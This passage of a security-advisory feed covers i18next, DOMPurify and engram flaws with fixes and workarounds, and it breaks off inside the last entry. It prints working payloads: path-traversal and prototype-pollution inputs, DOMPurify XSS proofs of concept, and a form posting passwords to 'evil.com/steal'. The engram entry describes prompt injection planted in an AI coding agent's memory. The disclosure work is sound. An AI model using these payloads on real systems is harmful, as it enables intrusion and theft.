        <title type="html"><![CDATA[[i18next-http-backend]  i18next-http-backend has Path Traversal & URL Injection via Unsanitised lng/ns]]></title>
        <id>https://github.com/advisories/GHSA-q89c-q3h5-w34g</id>
        <link href="https://github.com/advisories/GHSA-q89c-q3h5-w34g"/>
        <updated>2026-04-22T17:41:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Versions of <code>i18next-http-backend</code> prior to 3.0.5 interpolate the <code>lng</code> and <code>ns</code> values directly into the configured <code>loadPath</code> / <code>addPath</code> URL template without any encoding, validation, or path sanitisation. When an application exposes the language-code selection to user-controlled input (the default — <code>i18next-browser-languagedetector</code> reads <code>?lng=</code> query params, cookies, <code>localStorage</code>, and request headers), an attacker can inject characters that change the structure of the outgoing request URL.</p>
<p>Affected call sites:</p>
<ul>
<li><code>_readAny</code> — <code>lib/index.js:64</code>: <code>interpolate(resolvedLoadPath, { lng: languages.join('+'), ns: namespaces.join('+') })</code></li>
<li><code>create</code> — <code>lib/index.js:123</code> (pre-patch): <code>interpolate(addPath, { lng, ns: namespace })</code></li>
</ul>
<p>The helper <code>interpolate</code> (<code>lib/utils.js</code>) previously returned the raw value with no encoding. In contrast, <code>addQueryString</code> already correctly uses <code>encodeURIComponent</code> for each query-string param — only the URL-path substitution was unprotected.</p>
<h3 id="impact">Impact</h3>
<p>An attacker who can influence the resolved <code>lng</code> or <code>ns</code> value can alter the URL in several ways:</p>
<ul>
<li><strong>Path traversal</strong> — <code>lng = '../../config'</code> turns <code>/locales/{{lng}}/{{ns}}.json</code> into <code>/locales/../../config/translation.json</code>. On a misconfigured web server, this can cause the request to target a different resource than intended; in SSR pipelines that use <code>file://</code> or similar schemes for <code>loadPath</code>, it can read arbitrary files from the host filesystem.</li>
<li><strong>Query-string injection</strong> — <code>lng = 'en?admin=true'</code> turns <code>/locales/{{lng}}/{{ns}}.json</code> into <code>/locales/en?admin=true/translation.json</code>. Some server frameworks parse the query portion with higher priority than the path and branch on attacker-controlled flags.</li>
<li><strong>Fragment truncation</strong> — <code>lng = 'en#anything'</code> silently discards the rest of the path in browser fetches (client cannot see the final URL).</li>
<li><strong>URL-encoded bypasses</strong> — <code>lng = 'en%2F..'</code>, after server-side URL decoding, resolves to <code>en/..</code> — the attacker bypasses the absence of a literal <code>/</code> in their input.</li>
</ul>
<p>The practical worst case is <strong>SSRF</strong> when <code>loadPath</code> is an internal or file-scheme URL, and <strong>path-based authorisation bypass</strong> against servers that segment access by URL prefix.</p>
<h3 id="also-fixed-in-305">Also fixed in 3.0.5</h3>
<ul>
<li><strong>Per-instance <code>omitFetchOptions</code>.</strong> A module-level boolean in <code>lib/request.js</code> was flipped to <code>true</code> the first time any backend instance hit a "not implemented" fetch error. Once flipped, <strong>all</strong> subsequent requests from <strong>all</strong> backend instances in the same module silently stripped every user-configured fetch option — including security-relevant <code>credentials</code>, <code>mode</code>, and <code>cache</code>. One misbehaving instance (for example during SSR hydration or in React Native) permanently removed these protections process-wide. 3.0.5 scopes the flag to the backend's <code>options</code> object (<code>options._omitFetchOptions</code>) so one instance's fallback cannot pollute siblings.</li>
<li><strong>Log forging via control characters in <code>lng</code>/<code>ns</code>.</strong> Error callbacks embedded the raw <code>lng</code>/<code>ns</code>/URL in the message string. Crafted CR/LF values could inject fake log lines into file-backed log aggregators (CWE-117). 3.0.5 strips C0/C1 control chars before concatenation.</li>
<li><strong>Basic-auth credentials leaked into error callbacks.</strong> If <code>loadPath</code> contained a <code>user:password@host</code> authority, the full URL (including the credentials) ended up in the error message strings returned to the caller. 3.0.5 redacts <code>user:password@</code> before logging.</li>
<li><strong>Prototype-pollution amplification via <code>for...in</code>.</strong> <code>addQueryString</code> and the XHR <code>customHeaders</code> loop used <code>for...in</code> which walks the prototype chain. Polluted <code>Object.prototype</code> entries could leak into URL query parameters and request headers. 3.0.5 uses <code>Object.keys</code> and an explicit prototype-key guard.</li>
</ul>
<h3 id="affected-versions">Affected versions</h3>
<p>All versions of <code>i18next-http-backend</code> prior to <strong>3.0.5</strong>.</p>
<h3 id="patch">Patch</h3>
<p>Fixed in <strong>3.0.5</strong>. Summary of the hardening:</p>
<ol>
<li>New <code>utils.interpolateUrl</code> (used by <code>_readAny</code> and <code>create</code>) returns <code>null</code> if any substitution fails the URL-segment safety check (blocks <code>..</code>, <code>/</code>, <code>\</code>, <code>?</code>, <code>#</code>, <code>%</code>, <code>@</code>, whitespace, control chars, prototype keys, and values &gt; 128 chars). Multi-language joins (<code>en+de</code>) are validated per-segment. The call sites now refuse to issue a request when the check fails and call back with a clear error.</li>
<li><code>omitFetchOptions</code> is stored per-instance on <code>options._omitFetchOptions</code>.</li>
<li>Error-callback messages sanitise strings and redact URL credentials.</li>
<li><code>for...in</code> over untrusted objects replaced with <code>Object.keys</code> + prototype-key guard.</li>
</ol>
<h3 id="workarounds">Workarounds</h3>
<p>No workaround short of upgrading. If you cannot upgrade immediately, sanitise <code>lng</code> / <code>ns</code> yourself before they reach i18next (strip <code>..</code>, <code>/</code>, <code>\</code>, <code>?</code>, <code>#</code>, <code>%</code>, whitespace, and control characters; cap the length).</p>
<h3 id="credits">Credits</h3>
<p>Discovered via an internal security audit of the i18next ecosystem.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/i18next/i18next-http-backend/security/advisories/GHSA-q89c-q3h5-w34g">https://github.com/i18next/i18next-http-backend/security/advisories/GHSA-q89c-q3h5-w34g</a></li>
<li><a href="https://github.com/advisories/GHSA-q89c-q3h5-w34g">https://github.com/advisories/GHSA-q89c-q3h5-w34g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q89c-q3h5-w34g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-22T17:41:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[i18next-http-middleware] i18next-http-middleware: Prototype pollution and path traversal via user-controlled language and namespace parameters]]></title>
        <id>https://github.com/advisories/GHSA-5fgg-jcpf-8jjw</id>
        <link href="https://github.com/advisories/GHSA-5fgg-jcpf-8jjw"/>
        <updated>2026-04-22T17:40:47.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Versions of <code>i18next-http-middleware</code> prior to 3.9.3 pass user-controlled <code>lng</code> and <code>ns</code> parameters to two internal paths that use them in ways that enable prototype pollution and, depending on the configured backend, path traversal or SSRF.</p>
<p>The vulnerable entry points are unauthenticated HTTP handlers that are part of the middleware's public API:</p>
<ul>
<li><code>getResourcesHandler</code> — reads <code>lng</code>/<code>ns</code> from query parameters or route params and passes them unvalidated to:<ul>
<li><code>utils.setPath(resources, [lng, ns], ...)</code> — the <code>setPath</code> helper did not guard against <code>__proto__</code>, <code>constructor</code>, or <code>prototype</code> keys, writing into <code>Object.prototype</code> when those values were supplied.</li>
<li><code>i18next.services.backendConnector.load(languages, namespaces, ...)</code> — depending on the configured backend, unvalidated path segments enabled filesystem path traversal (e.g. with <code>i18next-fs-backend</code>) or SSRF (e.g. with <code>i18next-http-backend</code>).</li>
<li>A <code>namespaces.forEach(ns =&gt; i18next.options.ns.push(ns))</code> loop additionally performed permanent, unbounded growth of the shared singleton namespace list.</li>
</ul>
</li>
<li><code>missingKeyHandler</code> — iterated the incoming request body with <code>for...in</code>, which traverses inherited prototype-chain properties. A POST body like <code>{"__proto__": {"isAdmin": true}}</code> was forwarded into <code>saveMissing</code>.</li>
</ul>
<h3 id="impact">Impact</h3>
<ul>
<li><strong>Prototype pollution</strong> — a single unauthenticated request of the form <code>GET /locales/resources.json?lng=__proto__&amp;ns=isAdmin</code> writes into <code>Object.prototype</code>, affecting every plain object created subsequently in the Node.js process. This can break authorization checks (<code>if (user.isAdmin)</code>), cause denial of service via type confusion, or be chained into RCE depending on what downstream code reads from polluted objects.</li>
<li><strong>Path traversal / SSRF</strong> — with filesystem or HTTP backends that interpolate <code>lng</code>/<code>ns</code> into paths or URLs, attacker-controlled values like <code>ns=../../etc/passwd</code> or <code>lng=internal-service</code> could reach resources outside the intended scope.</li>
<li><strong>Denial of service</strong> — the unbounded <code>i18next.options.ns</code> growth, plus repeated backend load calls, enabled memory and CPU exhaustion from unique namespace payloads.</li>
</ul>
<h3 id="affected-versions">Affected versions</h3>
<p><code>&lt; 3.9.3</code>.</p>
<h3 id="patch">Patch</h3>
<p>Fixed in <strong>3.9.3</strong>. The patch:</p>
<ol>
<li>Blocks <code>__proto__</code>, <code>constructor</code>, and <code>prototype</code> keys in <code>utils.setPath</code>.</li>
<li>Replaces the <code>for...in</code> body iteration in <code>missingKeyHandler</code> with <code>Object.keys()</code> plus an explicit dangerous-keys guard.</li>
<li>Introduces a <code>utils.isSafeIdentifier</code> helper (denylist approach — still permits any legitimate i18next language code shape) that filters <code>lng</code>/<code>ns</code> values for path-traversal, path separators, control characters, prototype keys, and over-long inputs before they reach the backend connector and before they are pushed into <code>i18next.options.ns</code>.</li>
</ol>
<h3 id="workarounds">Workarounds</h3>
<p>No workaround short of upgrading. Front-proxying the middleware with a WAF rule that rejects requests containing <code>__proto__</code>, <code>constructor</code>, <code>prototype</code>, <code>..</code>, or control characters in <code>lng</code>/<code>ns</code> query parameters or body keys is a partial mitigation.</p>
<h3 id="credits">Credits</h3>
<p>Discovered via an internal security audit of the i18next ecosystem.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/i18next/i18next-http-middleware/security/advisories/GHSA-5fgg-jcpf-8jjw">https://github.com/i18next/i18next-http-middleware/security/advisories/GHSA-5fgg-jcpf-8jjw</a></li>
<li><a href="https://www.i18next.com/how-to/faq#how-should-the-language-codes-be-formatted">https://www.i18next.com/how-to/faq#how-should-the-language-codes-be-formatted</a></li>
<li><a href="https://github.com/advisories/GHSA-5fgg-jcpf-8jjw">https://github.com/advisories/GHSA-5fgg-jcpf-8jjw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5fgg-jcpf-8jjw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-22T17:40:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dompurify] DOMPurify: FORBID_TAGS bypassed by function-based ADD_TAGS predicate (asymmetry with FORBID_ATTR fix)]]></title>
        <id>https://github.com/advisories/GHSA-h7mw-gpvr-xq4m</id>
        <link href="https://github.com/advisories/GHSA-h7mw-gpvr-xq4m"/>
        <updated>2026-04-22T17:34:18.000Z</updated>
        <content type="html"><![CDATA[<p>There is an inconsistency between FORBID_TAGS and FORBID_ATTR handling when function-based ADD_TAGS is used.</p>
<p>Commit <a href="https://github.com/cure53/DOMPurify/commit/c361baa18dbdcb3344a41110f4c48ad85bf48f80">c361baa</a> added an early exit for FORBID_ATTR at line 1214:</p>
<pre><code>/* FORBID_ATTR must always win, even if ADD_ATTR predicate would allow it */
if (FORBID_ATTR[lcName]) {
  return false;
}
</code></pre>
<p>The same fix was not applied to FORBID_TAGS. At line 1118-1123, when EXTRA_ELEMENT_HANDLING.tagCheck returns true, the short-circuit evaluation skips the FORBID_TAGS check entirely:</p>
<pre><code>if (
  !(
    EXTRA_ELEMENT_HANDLING.tagCheck instanceof Function &amp;&amp;
    EXTRA_ELEMENT_HANDLING.tagCheck(tagName)  // true -&gt; short-circuits
  ) &amp;&amp;
  (!ALLOWED_TAGS[tagName] || FORBID_TAGS[tagName])  // never evaluated
) {
</code></pre>
<p>This allows forbidden elements to survive sanitization with their attributes intact.</p>
<p>PoC (tested against current HEAD in Node.js + jsdom):</p>
<pre><code>const DOMPurify = createDOMPurify(window);

DOMPurify.sanitize(
  '&lt;iframe src="https://evil.com"&gt;&lt;/iframe&gt;',
  {
    ADD_TAGS: function(tag) { return true; },
    FORBID_TAGS: ['iframe']
  }
);
// Returns: '&lt;iframe src="https://evil.com"&gt;&lt;/iframe&gt;'
// Expected: '' (iframe forbidden)

DOMPurify.sanitize(
  '&lt;form action="https://evil.com/steal"&gt;&lt;input name=password&gt;&lt;/form&gt;',
  {
    ADD_TAGS: function(tag) { return true; },
    FORBID_TAGS: ['form']
  }
);
// Returns: '&lt;form action="https://evil.com/steal"&gt;&lt;input name="password"&gt;&lt;/form&gt;'
// Expected: '&lt;input name="password"&gt;' (form forbidden)
</code></pre>
<p>Confirmed affected: iframe, object, embed, form. The src/action/data attributes survive because attribute sanitization runs separately and allows these URLs.</p>
<p>Compare with FORBID_ATTR which correctly wins:</p>
<pre><code>DOMPurify.sanitize(
  '&lt;p onclick="alert(1)"&gt;hello&lt;/p&gt;',
  {
    ADD_ATTR: function(attr) { return true; },
    FORBID_ATTR: ['onclick']
  }
);
// Returns: '&lt;p&gt;hello&lt;/p&gt;' (onclick correctly removed)
</code></pre>
<p>Suggested fix: add FORBID_TAGS early exit before the tagCheck evaluation, mirroring line 1214:</p>
<pre><code>/* FORBID_TAGS must always win, even if ADD_TAGS predicate would allow it */
if (FORBID_TAGS[tagName]) {
  // proceed to removal logic
}
</code></pre>
<p>This requires function-based ADD_TAGS in the config, which is uncommon. But the asymmetry with the FORBID_ATTR fix is clear, and the impact includes iframe and form injection with external URLs.</p>
<p>Reporter: Koda Reef</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cure53/DOMPurify/security/advisories/GHSA-h7mw-gpvr-xq4m">https://github.com/cure53/DOMPurify/security/advisories/GHSA-h7mw-gpvr-xq4m</a></li>
<li><a href="https://github.com/cure53/DOMPurify/releases/tag/3.4.0">https://github.com/cure53/DOMPurify/releases/tag/3.4.0</a></li>
<li><a href="https://github.com/advisories/GHSA-h7mw-gpvr-xq4m">https://github.com/advisories/GHSA-h7mw-gpvr-xq4m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h7mw-gpvr-xq4m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-22T17:34:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dompurify] DOMPurify has a SAFE_FOR_TEMPLATES bypass in RETURN_DOM mode]]></title>
        <id>https://github.com/advisories/GHSA-crv5-9vww-q3g8</id>
        <link href="https://github.com/advisories/GHSA-crv5-9vww-q3g8"/>
        <updated>2026-04-22T17:32:56.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<table>
<thead>
<tr>
<th align="left">Field</th>
<th align="left">Value</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>Severity</strong></td>
<td align="left">Medium</td>
</tr>
<tr>
<td align="left"><strong>Affected</strong></td>
<td align="left">DOMPurify <code>main</code> at <a href="https://github.com/cure53/DOMPurify/tree/883ac15d47f907cb1a3b5a152fe90c4d8c10f9e6"><code>883ac15</code></a>, introduced in v1.0.10 (<a href="https://github.com/cure53/DOMPurify/commit/7fc196db0b42a0c360262dba0cc39c9c91bfe1ec"><code>7fc196db</code></a>)</td>
</tr>
</tbody></table>
<p><code>SAFE_FOR_TEMPLATES</code> strips <code>{{...}}</code> expressions from untrusted HTML. This works in string mode but not with <code>RETURN_DOM</code> or <code>RETURN_DOM_FRAGMENT</code>, allowing XSS via template-evaluating frameworks like Vue 2.</p>
<h2 id="technical-details">Technical Details</h2>
<p>DOMPurify strips template expressions in two passes:</p>
<ol>
<li><strong>Per-node</strong> — each text node is checked during the tree walk (<a href="https://github.com/cure53/DOMPurify/blob/883ac15d47f907cb1a3b5a152fe90c4d8c10f9e6/src/purify.ts#L1179-L1191"><code>purify.ts:1179-1191</code></a>):</li>
</ol>
<pre><code class="language-js">// pass #1: runs on every text node during tree walk
if (SAFE_FOR_TEMPLATES &amp;&amp; currentNode.nodeType === NODE_TYPE.text) {
  content = currentNode.textContent;
  content = content.replace(MUSTACHE_EXPR, ' ');  // {{...}} -&gt; ' '
  content = content.replace(ERB_EXPR, ' ');        // &lt;%...%&gt; -&gt; ' '
  content = content.replace(TMPLIT_EXPR, ' ');      // ${...  -&gt; ' '
  currentNode.textContent = content;
}
</code></pre>
<ol start="2">
<li><strong>Final string scrub</strong> — after serialization, the full HTML string is scrubbed again (<a href="https://github.com/cure53/DOMPurify/blob/883ac15d47f907cb1a3b5a152fe90c4d8c10f9e6/src/purify.ts#L1679-L1683"><code>purify.ts:1679-1683</code></a>). This is the safety net that catches expressions that only form after the DOM settles.</li>
</ol>
<p>The <code>RETURN_DOM</code> path returns before pass #2 ever runs (<a href="https://github.com/cure53/DOMPurify/blob/883ac15d47f907cb1a3b5a152fe90c4d8c10f9e6/src/purify.ts#L1637-L1661"><code>purify.ts:1637-1661</code></a>):</p>
<pre><code class="language-js">// purify.ts (simplified)

if (RETURN_DOM) {
  // ... build returnNode ...
  return returnNode;        // &lt;-- exits here, pass #2 never runs
}

// pass #2: only reached by string-mode callers
if (SAFE_FOR_TEMPLATES) {
  serializedHTML = serializedHTML.replace(MUSTACHE_EXPR, ' ');
}
return serializedHTML;
</code></pre>
<p>The payload <code>{&lt;foo&gt;&lt;/foo&gt;{constructor.constructor('alert(1)')()}&lt;foo&gt;&lt;/foo&gt;}</code> exploits this:</p>
<ol>
<li>Parser creates: <code>TEXT("{")</code> → <code>&lt;foo&gt;</code> → <code>TEXT("{payload}")</code> → <code>&lt;foo&gt;</code> → <code>TEXT("}")</code> — no single node contains <code>{{</code>, so pass #1 misses it</li>
<li><code>&lt;foo&gt;</code> is not allowed, so DOMPurify removes it but keeps surrounding text</li>
<li>The three text nodes are now adjacent — <code>.outerHTML</code> reads them as <code>{{payload}}</code>, which Vue 2 compiles and executes</li>
</ol>
<h2 id="reproduce">Reproduce</h2>
<p>Open the following html in any browser and <code>alert(1)</code> pops up.</p>
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;

&lt;body&gt;
  &lt;script src="https://cdn.jsdelivr.net/npm/dompurify@3.3.3/dist/purify.min.js"&gt;&lt;/script&gt;
  &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.min.js"&gt;&lt;/script&gt;
  &lt;script&gt;
    var dirty = '&lt;div id="app"&gt;{&lt;foo&gt;&lt;/foo&gt;{constructor.constructor("alert(1)")()}&lt;foo&gt;&lt;/foo&gt;}&lt;/div&gt;';
    var dom = DOMPurify.sanitize(dirty, { SAFE_FOR_TEMPLATES: true, RETURN_DOM: true });
    document.body.appendChild(dom.firstChild);
    new Vue({ el: '#app' });
  &lt;/script&gt;
&lt;/body&gt;

&lt;/html&gt;
</code></pre>
<h2 id="impact">Impact</h2>
<p>Any application that sanitizes attacker-controlled HTML with <code>SAFE_FOR_TEMPLATES: true</code> and <code>RETURN_DOM: true</code> (or <code>RETURN_DOM_FRAGMENT: true</code>), then mounts the result into a template-evaluating framework, is vulnerable to XSS.</p>
<h2 id="recommendations">Recommendations</h2>
<h3 id="fix">Fix</h3>
<p><code>normalize()</code> merges the split text nodes, then the same regex from the string path catches the expression. Placed before the fragment logic, this fixes both <code>RETURN_DOM</code> and <code>RETURN_DOM_FRAGMENT</code>.</p>
<pre><code class="language-diff">     if (RETURN_DOM) {
+      if (SAFE_FOR_TEMPLATES) {
+        body.normalize();
+        let html = body.innerHTML;
+        arrayForEach([MUSTACHE_EXPR, ERB_EXPR, TMPLIT_EXPR], (expr: RegExp) =&gt; {
+          html = stringReplace(html, expr, ' ');
+        });
+        body.innerHTML = html;
+      }
+
       if (RETURN_DOM_FRAGMENT) {
         returnNode = createDocumentFragment.call(body.ownerDocument);
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cure53/DOMPurify/security/advisories/GHSA-crv5-9vww-q3g8">https://github.com/cure53/DOMPurify/security/advisories/GHSA-crv5-9vww-q3g8</a></li>
<li><a href="https://github.com/cure53/DOMPurify/releases/tag/3.4.0">https://github.com/cure53/DOMPurify/releases/tag/3.4.0</a></li>
<li><a href="https://github.com/advisories/GHSA-crv5-9vww-q3g8">https://github.com/advisories/GHSA-crv5-9vww-q3g8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-crv5-9vww-q3g8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-22T17:32:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dompurify] DOMPurify: Prototype Pollution to XSS Bypass via CUSTOM_ELEMENT_HANDLING Fallback]]></title>
        <id>https://github.com/advisories/GHSA-v9jr-rg53-9pgp</id>
        <link href="https://github.com/advisories/GHSA-v9jr-rg53-9pgp"/>
        <updated>2026-04-22T17:31:32.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>DOMPurify versions 3.0.1 through 3.3.3 (latest) are vulnerable to a prototype pollution-based XSS bypass. When an application uses <code>DOMPurify.sanitize()</code> with the default configuration (no <code>CUSTOM_ELEMENT_HANDLING</code> option), a prior prototype pollution gadget can inject permissive <code>tagNameCheck</code> and <code>attributeNameCheck</code> regex values into <code>Object.prototype</code>, causing DOMPurify to allow arbitrary custom elements with arbitrary attributes — including event handlers — through sanitization.</p>
<h2 id="affected-versions">Affected Versions</h2>
<ul>
<li><strong>3.0.1 through 3.3.3</strong> (current latest) — all affected</li>
<li><strong>3.0.0 and all 2.x versions</strong> — NOT affected (used <code>Object.create(null)</code> for initialization, no <code>|| {}</code> reassignment)</li>
<li>The vulnerable <code>|| {}</code> reassignment was introduced in the 3.0.0→3.0.1 refactor</li>
<li>This is <strong>distinct</strong> from GHSA-cj63-jhhr-wcxv (USE_PROFILES Array.prototype pollution, fixed in 3.3.2)</li>
<li>This is <strong>distinct</strong> from CVE-2024-45801 / GHSA-mmhx-hmjr-r674 (__depth prototype pollution, fixed in 3.1.3)</li>
</ul>
<h2 id="root-cause">Root Cause</h2>
<p>In <code>purify.js</code> at line 590, during config parsing:</p>
<pre><code class="language-javascript">CUSTOM_ELEMENT_HANDLING = cfg.CUSTOM_ELEMENT_HANDLING || {};
</code></pre>
<p>When no <code>CUSTOM_ELEMENT_HANDLING</code> is specified in the config (the default usage pattern), <code>cfg.CUSTOM_ELEMENT_HANDLING</code> is <code>undefined</code>, and the fallback <code>{}</code> is used. This plain object inherits from <code>Object.prototype</code>.</p>
<p>Lines 591-598 then check <code>cfg.CUSTOM_ELEMENT_HANDLING</code> (the original config property) — which is <code>undefined</code> — so the conditional blocks that would set <code>tagNameCheck</code> and <code>attributeNameCheck</code> from the config are never entered.</p>
<p>As a result, <code>CUSTOM_ELEMENT_HANDLING.tagNameCheck</code> and <code>CUSTOM_ELEMENT_HANDLING.attributeNameCheck</code> resolve via the prototype chain. If an attacker has polluted <code>Object.prototype.tagNameCheck</code> and <code>Object.prototype.attributeNameCheck</code> with permissive values (e.g., <code>/.*/</code>), these polluted values flow into DOMPurify's custom element validation at lines 973-977 and attribute validation, causing all custom elements and all attributes to be allowed.</p>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Attack type:</strong> XSS bypass via prototype pollution chain</li>
<li><strong>Prerequisites:</strong> Attacker must have a prototype pollution primitive in the same execution context (e.g., vulnerable version of lodash, jQuery.extend, query-string parser, deep merge utility, or any other PP gadget)</li>
<li><strong>Config required:</strong> Default. No special DOMPurify configuration needed. The standard <code>DOMPurify.sanitize(userInput)</code> call is affected.</li>
<li><strong>Payload:</strong> Any HTML custom element (name containing a hyphen) with event handler attributes survives sanitization</li>
</ul>
<h2 id="proof-of-concept">Proof of Concept</h2>
<pre><code class="language-javascript">// Step 1: Attacker exploits a prototype pollution gadget elsewhere in the application
Object.prototype.tagNameCheck = /.*/;
Object.prototype.attributeNameCheck = /.*/;

// Step 2: Application sanitizes user input with DEFAULT config
const clean = DOMPurify.sanitize('&lt;x-x onfocus=alert(document.cookie) tabindex=0 autofocus&gt;');

// Step 3: "Sanitized" output still contains the event handler
console.log(clean);
// Output: &lt;x-x onfocus="alert(document.cookie)" tabindex="0" autofocus=""&gt;

// Step 4: When injected into DOM, XSS executes
document.body.innerHTML = clean; // alert() fires
</code></pre>
<h3 id="tested-configurations-that-are-vulnerable">Tested configurations that are vulnerable:</h3>
<table>
<thead>
<tr>
<th>Call Pattern</th>
<th>Vulnerable?</th>
</tr>
</thead>
<tbody><tr>
<td><code>DOMPurify.sanitize(input)</code></td>
<td>YES</td>
</tr>
<tr>
<td><code>DOMPurify.sanitize(input, {})</code></td>
<td>YES</td>
</tr>
<tr>
<td><code>DOMPurify.sanitize(input, { CUSTOM_ELEMENT_HANDLING: null })</code></td>
<td>YES</td>
</tr>
<tr>
<td><code>DOMPurify.sanitize(input, { CUSTOM_ELEMENT_HANDLING: {} })</code></td>
<td>NO (explicit object triggers L591 path)</td>
</tr>
</tbody></table>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Change line 590 from:</p>
<pre><code class="language-javascript">CUSTOM_ELEMENT_HANDLING = cfg.CUSTOM_ELEMENT_HANDLING || {};
</code></pre>
<p>To:</p>
<pre><code class="language-javascript">CUSTOM_ELEMENT_HANDLING = cfg.CUSTOM_ELEMENT_HANDLING || create(null);
</code></pre>
<p>The <code>create(null)</code> function (already used elsewhere in DOMPurify, e.g., in <code>clone()</code>) creates an object with no prototype, preventing prototype chain inheritance.</p>
<h3 id="alternative-application-level-mitigation">Alternative application-level mitigation:</h3>
<p>Applications can protect themselves by always providing an explicit <code>CUSTOM_ELEMENT_HANDLING</code> in their config:</p>
<pre><code class="language-javascript">DOMPurify.sanitize(input, {
  CUSTOM_ELEMENT_HANDLING: {
    tagNameCheck: null,
    attributeNameCheck: null
  }
});
</code></pre>
<h2 id="timeline">Timeline</h2>
<ul>
<li><strong>2026-04-04:</strong> Vulnerability discovered during automated DOMPurify fuzzing research (Fermat project)</li>
<li><strong>2026-04-04:</strong> Confirmed in Chrome browser with DOMPurify 3.3.3</li>
<li><strong>2026-04-04:</strong> Verified distinct from GHSA-cj63-jhhr-wcxv and CVE-2024-45801</li>
<li><strong>2026-04-04:</strong> Advisory drafted, responsible disclosure initiated</li>
</ul>
<h2 id="credit">Credit</h2>
<p><a href="https://github.com/trace37labs">https://github.com/trace37labs</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cure53/DOMPurify/security/advisories/GHSA-v9jr-rg53-9pgp">https://github.com/cure53/DOMPurify/security/advisories/GHSA-v9jr-rg53-9pgp</a></li>
<li><a href="https://github.com/cure53/DOMPurify/releases/tag/3.4.0">https://github.com/cure53/DOMPurify/releases/tag/3.4.0</a></li>
<li><a href="https://github.com/advisories/GHSA-v9jr-rg53-9pgp">https://github.com/advisories/GHSA-v9jr-rg53-9pgp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v9jr-rg53-9pgp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-22T17:31:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[engramx] engram: HTTP server CORS wildcard + auth-off-by-default enables CSRF graph exfiltration and persistent indirect prompt injection]]></title>
        <id>https://github.com/advisories/GHSA-2r2p-4cgf-hv7h</id>
        <link href="https://github.com/advisories/GHSA-2r2p-4cgf-hv7h"/>
        <updated>2026-04-22T14:52:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The local HTTP server started by <code>engram server</code> (binding <code>127.0.0.1:7337</code> by default) was exposed to any browser origin with no authentication unless <code>ENGRAM_API_TOKEN</code> was explicitly set. Combined with <code>Access-Control-Allow-Origin: *</code> on every response and a body parser that did not require <code>Content-Type: application/json</code>, this allowed a malicious web page the developer visited to:</p>
<ol>
<li><strong>Exfiltrate</strong> the local knowledge graph via <code>GET /query</code> and <code>GET /stats</code> (function names, file layout, recorded decisions/mistakes).</li>
<li><strong>Inject persistent prompt-injection payloads</strong> via <code>POST /learn</code>, which wrote <code>mistake</code>/<code>decision</code> nodes that were later surfaced as system-reminders to the user's AI coding agent on every future session and file edit.</li>
</ol>
<p>Severity: <strong>High</strong> — confidentiality + persistent indirect prompt injection against the user's coding agent.</p>
<h3 id="affected-versions">Affected versions</h3>
<p><code>engramx</code> &gt;= 1.0.0, &lt; 2.0.2 — any version that shipped the HTTP server.</p>
<h3 id="patched-in">Patched in</h3>
<p><code>engramx@2.0.2</code></p>
<h3 id="workarounds-if-you-cannot-upgrade">Workarounds (if you cannot upgrade)</h3>
<ul>
<li>Do <strong>not</strong> run <code>engram server</code> or <code>engram ui</code>.</li>
<li>If developers must, set <code>ENGRAM_API_TOKEN</code> to a long random value and terminate the server before browsing the web.</li>
</ul>
<h3 id="remediation-applied-in-202">Remediation (applied in 2.0.2)</h3>
<ol>
<li>Fail-closed auth on every non-public route — Bearer header or HttpOnly cookie, constant-time comparison, 256-bit auto-generated token at <code>~/.engram/http-server.token</code> (0600).</li>
<li>Wildcard CORS removed entirely; default is no CORS headers. Opt-in allowlist via <code>ENGRAM_ALLOWED_ORIGINS</code>.</li>
<li>Host + Origin validation — rejects DNS rebinding and Host spoofing.</li>
<li><code>Content-Type: application/json</code> enforced on mutations — blocks the text/plain CSRF vector.</li>
<li><code>/ui?token=</code> bootstrap with <code>Sec-Fetch-Site</code> gate — prevents cross-origin oracle probing.</li>
</ol>
<h3 id="credit">Credit</h3>
<p>Discovered and responsibly disclosed by @gabiudrescu in engram issue #7.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/NickCirv/engram/security/advisories/GHSA-2r2p-4cgf-hv7h">https://github.com/NickCirv/engram/security/advisories/GHSA-2r2p-4cgf-hv7h</a></li>
